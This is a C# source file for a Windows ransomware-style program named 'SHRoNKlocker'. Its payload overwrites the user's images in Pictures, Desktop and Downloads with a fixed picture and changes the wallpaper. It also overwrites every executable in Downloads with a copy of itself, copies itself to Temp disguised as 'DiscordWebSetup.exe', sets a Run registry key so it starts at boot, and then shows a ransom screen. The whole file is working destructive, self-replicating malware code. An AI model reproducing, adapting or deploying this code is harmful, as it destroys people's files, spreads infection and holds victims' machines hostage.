using Microsoft.Win32;
using System.Runtime.InteropServices;

namespace vector
{
    internal static class Program
    {
        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        [STAThread]
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
        private static readonly UInt32 SPI_SETDESKWALLPAPER = 0x14;
        private static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
        private static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;

        static List<string> directoriesToSearch = new List<string>(); // Directories to search for images
        static List<string> directoriesToSearchExe = new List<string>(); // Directories to search for executables
        static List<string> fileList = new List<string>();
        static List<string> fileListExe = new List<string>();

        public static void Log(string logMessage)
        {
            using (StreamWriter w = File.AppendText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "SHRoNKlocker", "SHRoNKlogz.txt")))
            {
                LogWrite(logMessage, w);
            }
        }

        public static void LogWrite(string logMessage, TextWriter w)
        {
            w.WriteLine($"{DateTime.Now.ToLongTimeString()} {DateTime.Now.ToLongDateString()}");
            w.WriteLine("  :");
            w.WriteLine($"  :{logMessage}");
            w.WriteLine("-------------------------------");
        }

        static void searchDirImage(string directory) // Find all images files in a directory
        {
            try
            {
                string[] files = Directory.GetFiles(directory);
                foreach (string file in files)
                {
                    if (file.EndsWith(".jpg") || file.EndsWith(".png") || file.EndsWith(".gif") || file.EndsWith(".jpeg"))
                    {
                        fileList.Add(file);
                    }
                }
            }
            catch (UnauthorizedAccessException)
            {
                return;
            }
            try
            {
                string[] subDirectories = Directory.GetDirectories(directory);
                foreach (string subDirectory in subDirectories)
                {
                    searchDirImage(subDirectory);
                }
            }
            catch (UnauthorizedAccessException)
            {
                return;
            }
        }
        static void searchDirExe(string directory) // Find all images files in a directory
        {
            try
            {
                string[] files = Directory.GetFiles(directory);
                foreach (string file in files)
                {
                    if (file.EndsWith(".exe"))
                    {
                        fileListExe.Add(file);
                    }
                }
            }
            catch (UnauthorizedAccessException)
            {
                return;
            }
            try
            {
                string[] subDirectories = Directory.GetDirectories(directory);
                foreach (string subDirectory in subDirectories)
                {
                    searchDirExe(subDirectory);
                }
            }
            catch (UnauthorizedAccessException)
            {
                return;
            }
        }
        static public void SetWallpaper(String path)
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            key.SetValue(@"WallpaperStyle", 2.ToString()); // 2 is stretched
            key.SetValue(@"TileWallpaper", 0.ToString());
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }

        static void Payload(string[] args)
        {
            string nsisExec = args[0];
            Log("EXECUTED FROM: ");
            Log(nsisExec);
            File.Copy(nsisExec, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp", "DiscordWebSetup.exe"), true); // make temp copy of self
            string homePath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            directoriesToSearch.Add(homePath + "\\Pictures");
            directoriesToSearch.Add(homePath + "\\Desktop");
            directoriesToSearch.Add(homePath + "\\Downloads");

            directoriesToSearchExe.Add(homePath + "\\Downloads");

            foreach (string directory in directoriesToSearch) // search for images
            {
                searchDirImage(directory);
            }
            foreach (string file in fileList) // replace images
            {
                Log(file);
                if (file.EndsWith(".jpg"))
                {
                    File.Copy("vector.jpg", file, true);
                }
                else if (file.EndsWith("*.jpeg"))
                {
                    File.Copy("vector.jpg", file, true);
                }
                else if (file.EndsWith(".png"))
                {
                    File.Copy("vector.png", file, true);
                }
                else if (file.EndsWith(".gif"))
                {
                    File.Copy("vector.gif", file, true);
                }
            }
            SetWallpaper(Path.GetFullPath(@"vector.jpg")); // set wallpaper too

            foreach (string directory in directoriesToSearchExe) // search for executables
            {
                searchDirExe(directory);
            }
            foreach (string file in fileListExe)
            {
                Log(file);
                try
                {
                    File.Copy(nsisExec, file, true); // self replicate
                }
                catch (UnauthorizedAccessException)
                {
                    return;
                }
                catch (IOException)
                {
                    return;
                }

            }
            using (File.Create(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "SHRoNKlocker", "HasRun"))) { } // stop payload on next run

            if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp", "DiscordWebSetup.exe"))) // set to run ransom on boot
            {
                RegistryKey add = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                add.SetValue("SHRoNKlocker", "\"" + Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp", "DiscordWebSetup.exe") + "\"");
            }

        }
        static void Main(string[] args)
        {
            // To customize application configuration such as set high DPI settings or default font,
            // see https://aka.ms/applicationconfiguration.
            ApplicationConfiguration.Initialize();
            Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "SHRoNKlocker"));

            if(File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "SHRoNKlocker", "HasRun"))) // stop if run before
            {
                Log("RUN BEFORE - LOAD RANSOM SCREEN");
            } else if (Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "SHRoNKprotectz"))) // stop if protected by SHRoNK AV
            {
                Log("Quit - protected by SHRoNK");
                Environment.Exit(0);
                Application.Exit();
            } else {
                Payload(args);
            }


            Application.Run(new ransom());
        }
    }
}